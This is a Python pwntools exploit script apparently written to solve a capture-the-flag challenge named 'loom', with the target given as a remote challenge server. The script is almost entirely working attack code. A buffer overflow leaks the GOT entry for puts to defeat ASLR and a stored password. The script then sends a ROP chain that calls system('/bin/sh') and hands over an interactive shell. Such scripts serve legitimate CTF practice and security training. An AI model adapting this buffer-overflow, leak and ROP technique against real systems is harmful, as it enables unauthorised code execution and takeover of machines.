#!/usr/bin/env python3
from pwn import *
import subprocess

elf = ELF("./loom_patched")
libc = ELF("./libc6_2.35-0ubuntu3.1_amd64.so")

context.binary = elf
NULL = 0x0

def conn():
    global p, ssh_con
    ssh_conn = ('HOST', 22, 'USER', 'PASS', 'BIN_NAME')
    if args.FLAG:
        running = log.progress("Createing the flag...")
        try:
            os.system("echo 'PWN{a_placeholder_32byte_flag}' > flag.txt")
            running.success()
        except:
            running.failure()
    if args.REMOTE:
        p = remote("0.cloud.chals.io", 33616)
    elif args.SSH:
        sshc = ssh(ssh_conn[2], ssh_conn[0], ssh_conn[1], ssh_conn[3])
        p = sshc.process([ssh_conn[4]])
    else:
        p = process([elf.path])
        if args.GDB:
            gdb.attach(p,'''
                b *0x40147d
                ''')
        if args.PATCH:
            elf.asm(elf.symbols['alarm'], 'ret')
            elf.save([elf.path])
    return p

def get_one_gadget(filename: str, base_address=NULL) -> int:
    return [i + base_address for i in [int(i) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]]

def roomOfLoom(content):
    p.sendlineafter(b"> ", b"1", timeout=0.1)
    p.sendlineafter(b"> ", b"1", timeout=0.1)
    p.sendline(content)

def roomOfFate(PASSWORD):
    p.sendlineafter(b"> ", b"3", timeout=0.1)
    p.sendlineafter(b"> ", PASSWORD.encode(), timeout=0.1)
    p.sendlineafter(b"> ", b"1", timeout=0.1)

def print_():
    p.sendlineafter(b"> ", b"2", timeout=0.1) 

def Leak(to_leak):
    payload = flat(
        b"a" * 0x118,
        to_leak,
    )

    roomOfLoom(payload)
    print_()

    p.recvuntil(b"ancient : \n")
    p.recvline()

    leak = p.recvline()
    try:
        leak = u64(leak.strip().ljust(8, b"\x00"))
        return leak
    except:
        return leak.strip().decode()

def get_shell(PASSWORD):
    rop = ROP(elf)
    rop_libc = ROP(libc)

    address_14_offset = 0x3b114 + libc.address
    ret = rop.find_gadget(['ret'])[0]
    pop_rdi = rop_libc.find_gadget(['pop rdi', 'ret'])[0]
    bin_sh = next(libc.search(b"/bin/sh\x00"))
    system = libc.symbols['system']

    payload = flat(
        b"A" * 0x98,
        libc.symbols['gets']
    )

    roomOfLoom(payload)
    roomOfFate(PASSWORD)

    call_system = flat(
        address_14_offset,
        ret,
        pop_rdi,
        bin_sh,
        system,
    )

    p.clean()
    p.sendline(call_system)
    p.interactive()

def main():
    with conn() as p:
        puts_leak = Leak(elf.got['puts'])
        log.info(f"puts_got @ {hex(puts_leak)}")    

        libc.address = puts_leak - libc.symbols['puts']
        log.info(f"libc-base @ {hex(libc.address)}")

        ## Password address in memory (static)
        password = Leak(0x40232a)       
        log.info(f"password @ {password}")
        
        get_shell(password)

if __name__ == "__main__":
    main()
